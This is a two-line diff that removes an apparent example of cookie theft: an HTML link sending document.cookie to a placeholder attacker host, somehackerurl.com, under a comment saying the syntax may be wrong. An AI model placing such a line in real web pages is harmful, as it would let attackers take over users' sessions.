@@ -1,2 +1,0 @@
-|    //this might not be the correct syntax
-    <a href="http://somehackerurl.com/hack.php?"+document.cookie>test</a>
